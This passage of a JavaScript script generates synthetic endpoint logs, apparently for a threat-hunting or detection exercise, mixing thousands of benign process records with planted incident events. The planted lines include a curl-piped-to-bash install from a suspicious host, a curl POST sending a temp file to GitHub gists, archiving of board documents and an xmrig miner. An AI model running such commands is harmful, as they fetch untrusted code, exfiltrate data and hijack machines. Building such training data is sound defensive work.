    ["/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", "Google Chrome --type=renderer", "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"],
    ["/usr/bin/git", "git fetch origin", "/bin/zsh"], ["/usr/local/bin/node", "node ./scripts/build.js", "/usr/local/bin/npm"],
    ["/usr/local/bin/npm", "npm ci", "/bin/zsh"], ["/usr/bin/curl", "curl -fsSL https://api.github.com/meta", "/bin/zsh"],
    ["/bin/zsh", "zsh -l", "/System/Library/CoreServices/loginwindow.app/Contents/MacOS/loginwindow"],
    ["/usr/bin/security", "security find-internet-password -s github.com", "/bin/zsh"]
  ],
  linux: [
    ["/usr/bin/python3", "python3 /opt/jobs/worker.py", "/usr/lib/systemd/systemd"], ["/usr/bin/bash", "bash /opt/ops/healthcheck.sh", "/usr/bin/systemd"],
    ["/usr/bin/curl", "curl -fsSL https://api.github.com/meta", "/usr/bin/bash"], ["/usr/bin/git", "git fetch --prune origin", "/usr/bin/bash"],
    ["/usr/local/bin/kubectl", "kubectl get pods -A", "/usr/bin/bash"], ["/usr/local/bin/aws", "aws sts get-caller-identity", "/usr/bin/bash"],
    ["/usr/bin/containerd-shim-runc-v2", "containerd-shim-runc-v2 -namespace k8s.io", "/usr/bin/containerd"]
  ]
};
const endpointRows = [["UtcTime", "Computer", "User", "Platform", "EventID", "Image", "CommandLine", "ParentImage", "DestinationIp", "DestinationPort", "Hashes"]];
function binaryHash(image) { return sha256(`halcyon-meridian-approved-binary:${image.toLowerCase()}`); }
const networkTemplates = {
  windows: processTemplates.windows.filter(([image]) => !image.endsWith("\\cmd.exe")),
  macos: processTemplates.macos.filter(([image]) => !["/bin/zsh", "/usr/bin/security"].includes(image)),
  linux: processTemplates.linux.filter(([image]) => !["/usr/bin/bash", "/usr/bin/containerd-shim-runc-v2"].includes(image))
};
for (let index = 0; index < 6800; index++) {
  const host = pick(hosts.filter((name) => name !== "ip-10-42-18-23"));
  const profile = hostProfiles[host];
  const networkEvent = rnd() < 0.19;
  const [image, commandLine, parent] = pick(networkEvent ? networkTemplates[profile.platform] : processTemplates[profile.platform]);
  const target = networkEvent ? pick(commonDomains) : null;
  endpointRows.push([
    iso(businessTime()).replace("T", " ").replace("Z", ""), host, pick(profile.users), profile.platform, networkEvent ? 3 : 1,
    image, networkEvent ? "" : commandLine, parent, networkEvent ? pick(domainMap[target]) : "", networkEvent ? pick([443, 443, 443, 443, 80]) : "", `SHA256=${binaryHash(image)}`
  ]);
}
function addEndpoint(values) { endpointRows.push(values); }
const chromePath = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
addEndpoint(["2026-03-13 15:13:58.000", "FIN-WS22", "e.park", "windows", 1, chromePath, "chrome.exe https://review-board-portal.com/session/84e2", "C:\\Windows\\explorer.exe", "", "", `SHA256=${binaryHash(chromePath)}`]);
addEndpoint(["2026-03-13 15:14:04.000", "FIN-WS22", "e.park", "windows", 3, chromePath, "", "C:\\Windows\\explorer.exe", "198.51.100.24", 443, `SHA256=${binaryHash(chromePath)}`]);
addEndpoint(["2026-03-13 16:40:18.000", "FIN-WS22", "m.sato", "windows", 1, "C:\\Program Files\\7-Zip\\7z.exe", "7z a C:\\Temp\\board_packets.7z C:\\BoardPrep\\Meridian\\*.pptx C:\\BoardPrep\\Meridian\\*.xlsx", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "", "", `SHA256=${binaryHash("C:\\Program Files\\7-Zip\\7z.exe")}`]);
addEndpoint(["2026-03-13 17:06:11.000", "MAC-DEV-17", "r.kapoor", "macos", 1, "/bin/bash", "bash -c curl -fsSL https://cdn-build-linker.com/install.sh | bash", "/usr/local/bin/node", "", "", `SHA256=${binaryHash("/bin/bash")}`]);
addEndpoint(["2026-03-13 17:06:15.000", "MAC-DEV-17", "r.kapoor", "macos", 1, "/usr/bin/curl", "curl -X POST https://api.github.com/gists -d @/tmp/s.txt", "/bin/bash", "", "", `SHA256=${binaryHash("/usr/bin/curl")}`]);
addEndpoint(["2026-03-13 19:40:01.000", "RSCH-JUP-03", "root", "linux", 1, "/tmp/xmrig", "/tmp/xmrig --donate-level=0 --url=stratum+tcp://pool-research.example:3333", "/usr/bin/bash", "", "", `SHA256=${sha256("xmrig-6.22-linux-x64")}`]);
const endpointHeader = endpointRows.shift();
endpointRows.sort((a, b) => a[0].localeCompare(b[0]));
write("endpoint_process_week.csv", [csvRow(endpointHeader), ...endpointRows.map(csvRow)]);

console.log(`generated ${oktaEvents.length} Okta, ${proxyEvents.length} proxy, ${cloudEvents.length} CloudTrail, ${dnsRows.length} DNS, and ${endpointRows.length} endpoint records`);
